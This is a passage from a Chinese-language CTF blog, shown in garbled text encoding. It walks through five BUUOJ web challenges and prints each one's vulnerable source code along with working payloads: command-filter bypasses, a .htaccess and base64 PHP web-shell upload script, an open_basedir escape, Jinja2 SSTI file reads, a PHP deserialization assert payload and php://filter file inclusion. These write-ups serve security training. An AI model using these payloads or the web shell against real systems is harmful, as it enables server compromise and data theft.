id="0X05-FBCTF2019-RCEService"><a href="#0X05-FBCTF2019-RCEService" class="headerlink" title="0X05:[FBCTF2019]RCEService"></a>0X05:[FBCTF2019]RCEService</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œå¯ä»¥ä½¿ç”¨çš„æ˜¯jsonæ ¼å¼çš„å‘½ä»¤æŸ¥è¯¢</p><p>å…ˆè¯•ä¸€ä¸‹{â€œcmdâ€:â€lsâ€}ï¼Œæç¤ºéæ³•è¾“å…¥ï¼Œæ¢æˆå…¶ä»–çš„æ‰§è¡Œå‘½ä»¤éƒ½ä¸å¤ªè¡Œï¼Œçœ‹äº†ä¸€ç¯‡åˆ«çš„å¸ˆå‚…çš„wpï¼Œè¯´æ˜¯åŸé¢˜æœ‰ç»™æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_matchåªä¼šåŒ¹é…ä¸€è¡Œçš„å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0Aæ¥ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š?cmd&#x3D;&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125; è¿™ä¸ªè·¯å¾„æŒºéš¾æ‰¾çš„23333</span><br><span class="line"></span><br><span class="line">&#123;%asset_img 7.png examplename%&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨prceå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡ï¼Œpç¥æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlï¼Œå¯ä»¥å»çœ‹çœ‹è¯•ä¸€ä¸‹" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlï¼Œå¯ä»¥å»çœ‹çœ‹è¯•ä¸€ä¸‹</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"'</span> + <span class="string">"a"</span>*(<span class="number">1000000</span>) + <span class="string">'"&#125;'</span></span><br><span class="line">res = requests.post(<span class="string">"http://af72594c-dbfc-4ef9-baa3-0738dbb5fdb9.node3.buuoj.cn/"</span>, data=&#123;<span class="string">"cmd"</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="0X06-SUCTF-2019-EasyWeb"><a href="#0X06-SUCTF-2019-EasyWeb" class="headerlink" title="0X06:[SUCTF 2019]EasyWeb"></a>0X06:[SUCTF 2019]EasyWeb</h4><p>æºç å®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;<span class="comment">//æ–‡ä»¶å¤¹feikong</span></span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);<span class="comment">//$nameåŒ¹é…åˆ°.å·æœ€åçš„ä½ç½®ä¸‹æ ‡+1ï¼ŒåŒ¹é…$nameä¸­n+1ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//åŒ¹é…åˆ°phç»“æŸ</span></span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);<span class="comment">//ä¸èƒ½åœ¨$tmp_nameä¸­åŒ¹é…åˆ°<span class="meta">&lt;?</span></span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//åˆ¤æ–­ä¸ºå›¾ç‰‡æ ¼å¼</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;<span class="comment">//è·¯å¾„</span></span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);<span class="comment">//      !#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¥çœ‹ä»£ç æ‰§è¡Œè°ƒç”¨get_the_flagéƒ¨åˆ†</p><p>å¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæ­£åˆ™è¡¨è¾¾å¼fuzzä¸€ä¸‹ï¼Œ!#$%()*+-/:;&lt;&gt;?@]^{}æ˜¯å¯ç”¨çš„ï¼Œè¿™é‡Œæƒ³åˆ°çš„æ˜¯ç”¨å¼‚æˆ–æ„é€ payloadï¼Œä¸‹é¢æ˜¯ç”Ÿæˆéœ€è¦å­—ç¬¦çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure><p>å‡‘å‡ºè¿™éƒ¨åˆ†çš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å†çœ‹å‡½æ•°éƒ¨åˆ†ï¼Œ&lt;?è¢«è¿‡æ»¤ï¼Œä½¿ç”¨äº†exif_imagetypeæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œæ–‡ä»¶åç¼€ä¸èƒ½å‡ºç°ph</p><p>è¿™é‡Œçš„phpç‰ˆæœ¬æ˜¯7.2çš„ï¼Œä¸èƒ½ç”¨&lt;script&gt;æ ‡ç­¾çš„æ–¹å¼æ¥ç»•è¿‡&lt;?,è¿™é‡Œå¯ä»¥ç”¨base64ç¼–ç ç»•è¿‡ï¼Œåœ¨.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç </p><p>shell.abc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>.htacess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>è®¿é—®?a=phpinfo();å¯ä»¥å¾—åˆ°phpinfoé¡µé¢ï¼Œè¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› åšçš„æ—¶å€™æ²¡æ³•å›æ˜¾ï¼Œä¸‹é¢çš„çŸ¥è¯†ç‚¹æ˜¯å‚è€ƒçš„</p><p>è¿™æ—¶ä¼šå‘ç°å­˜åœ¨open_basedirå’Œdisable_functionsçš„é™åˆ¶ </p><p>open_basedir:/var/www/html/:/tmp/ï¼ˆé™„ä¸Špayloadé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/4720ï¼‰" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720ï¼‰</a></p><p>è¿™æ˜¯æœ€åçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure><h4 id="0X06ï¼š-GYCTF2020-FlaskApp"><a href="#0X06ï¼š-GYCTF2020-FlaskApp" class="headerlink" title="0X06ï¼š[GYCTF2020]FlaskApp"></a>0X06ï¼š[GYCTF2020]FlaskApp</h4><p>è¿™æ˜¯ä¹‹å‰æ¯”èµ›åšå‡ºæ¥è¿‡çš„é¢˜ï¼Œç”¨çš„æ˜¯æ‹¼æ¥ï¼Œåšå‡ºæ¥ä¹‹åå¤ç°å¤±è´¥äº†ï¼Œç°åœ¨buuä¸Šæœ‰äº†ï¼Œå†æ¥åšä¸€æ¬¡è®°å½•ä¸€ä¸‹</p><p>è¿™æ˜¯ä¸€é“SSTIæ¨¡æ¿æ³¨å…¥ï¼Œå…ˆç¼–ç å†è§£ç ï¼Œå¯ä»¥å¾—åˆ°éœ€è¦çš„ä¿¡æ¯ï¼Œé¢˜ç›®æ˜¯flaskï¼Œå»æ‰¾flaskå¯¹åº”çš„æ¨¡æ¿æ³¨å…¥å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/8.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°æºç ï¼Œä¸‹é¢æ˜¯æºç ä¸­çš„WAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> black_list = [&amp;<span class="comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagï¼Œosï¼Œsystemç­‰éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ‹¼æ¥æ¥è¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/9.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶</p><p>è¿™æ¬¡ç”¨ä¸€ä¸‹åˆ‡ç‰‡å–åå­—ç¬¦ä¸²ï¼Œçœå»æ‹¼æ¥flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/10.png" class="" title="examplename"><h4 id="0X07ï¼š-NPUCTF2020-ReadlezPHP"><a href="#0X07ï¼š-NPUCTF2020-ReadlezPHP" class="headerlink" title="0X07ï¼š[NPUCTF2020]ReadlezPHP"></a>0X07ï¼š[NPUCTF2020]ReadlezPHP</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç½‘é¡µï¼Œåœ¨ç½‘é¡µæºç æ‰¾åˆ°äº†è·³è½¬é“¾æ¥ï¼Œæ‹¿åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€é“ç®€å•çš„phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$c = <span class="keyword">new</span> HelloPhp; </span><br><span class="line">$c-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line">$c-&gt;b=<span class="string">'assert'</span>;<span class="comment">//assertæ˜¯å°è¯•äº†åˆ«çš„æ‰§è¡Œå‡½æ•°åå‘ç°çš„</span></span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure><p>æŠŠåºåˆ—åŒ–æ•°æ®ä¼ ç»™dataï¼Œåœ¨phpinfoé¡µé¢æ‰¾åˆ°flagï¼Œæˆ–è€…ç½‘é¡µæºç å¤„ä¹Ÿå¯ä»¥</p><img src="/2020/05/16/buuoj3/11.png" class="" title="examplename"><h4 id="0X08ï¼š-BSidesCF-2020-Had-a-bad-day"><a href="#0X08ï¼š-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0X08ï¼š[BSidesCF 2020]Had a bad day"></a>0X08ï¼š[BSidesCF 2020]Had a bad day</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæœ‰æŒ‰é’®ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªurlå‡ºæ¥çš„å½¢å¼åº”è¯¥æ˜¯sqlæˆ–è€…æ–‡ä»¶åŒ…å«ï¼Œå°è¯•åŒ…å«index.php</p><img src="/2020/05/16/buuoj3/12.png" class="" title="examplename"><p>å‡ºé”™äº†ï¼Œå»æ‰äº†.phpåç¼€æˆåŠŸåŒ…å«ï¼Œbase64è§£ç ï¼Œè´´ä¸€ä¸‹ä¸»è¦çš„phpéƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯è§è¦æƒ³åŒ…å«æˆåŠŸ,categoryå‚æ•°å€¼ä¸­è¦æœ‰woofersï¼Œmeowersæˆ–è€…indexï¼Œåªéœ€è¦ç”¨ä¼ªåè®®å¥—ä¸€å±‚åè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;40a3219f-a796-4a79-9c4f-0dcd86f4e96a.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/13.png" class="" title="examplename"><p>base64è§£ç å°±èƒ½å¤Ÿçœ‹åˆ°flagäº†</p><h4 id="0X09ï¼š-WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#0X09ï¼š-WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" 